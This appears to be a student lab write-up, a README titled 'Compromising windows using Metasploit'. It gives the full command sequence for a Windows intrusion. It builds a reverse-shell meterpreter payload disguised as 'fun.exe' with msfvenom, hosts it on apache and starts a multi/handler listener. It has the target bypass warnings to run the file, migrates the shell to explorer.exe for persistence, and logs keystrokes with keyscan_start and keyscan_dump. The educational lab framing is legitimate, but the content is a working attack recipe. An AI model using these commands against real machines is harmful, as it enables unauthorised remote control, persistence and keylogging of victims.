# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT
![image](https://github.com/user-attachments/assets/0e455703-e0ab-4506-bc3c-d8cd8d6f10d6)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT
![image](https://github.com/user-attachments/assets/b128229a-2a5a-4470-a0ee-668d76225c09)

opy the fun.exe into the apache /var/www/html folder
![image](https://github.com/user-attachments/assets/c39330e6-98df-4d54-b570-7a864dc59237)


Start apache server
sudo systemctl apache2 start

![image](https://github.com/user-attachments/assets/2eca88d8-d02c-4580-a78e-c013c103e081)

Check the status of apache2

![image](https://github.com/user-attachments/assets/7e410c25-ee82-4cd8-9ee4-c8548ddc8a92)


Invoke msfconsole:

![image](https://github.com/user-attachments/assets/528a16d5-afeb-499e-ba2e-f6ac986f0708)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/user-attachments/assets/6f0c2629-c170-4646-ae71-033c2e2d8e42)

Starting a command and control Server

use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit
![image](https://github.com/user-attachments/assets/8b8c4c66-4e01-466a-ac64-53bf02f16428)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads. 

![image](https://github.com/user-attachments/assets/14b9b713-ea3f-4f15-b436-fca2928d3a1b)

Bypass any warning boxes, double-click the file, and allow it to run.
![image](https://github.com/user-attachments/assets/c00ae111-163b-45d3-ba31-40c61ab4129f)

On kali give the command exploit
![image](https://github.com/user-attachments/assets/73f634ba-42d2-46a3-82eb-ac01f80cda61)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/user-attachments/assets/9338ac5d-3d47-4b7a-8ae2-f790ffa2635f)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.

To become more persistent, we'll migrate to a process that will last longer.

Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.

Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/user-attachments/assets/16afe477-6ef8-412c-8228-72f9c010f937)


Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine

keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/d4810f9a-273c-4c18-890b-22f05db5c7a9)


![image](https://github.com/user-attachments/assets/81d5c71b-04bc-41c6-be8f-14131c6ba3c7)

keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/user-attachments/assets/dd8684dd-9383-4847-a29c-993fba4cdb4b)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
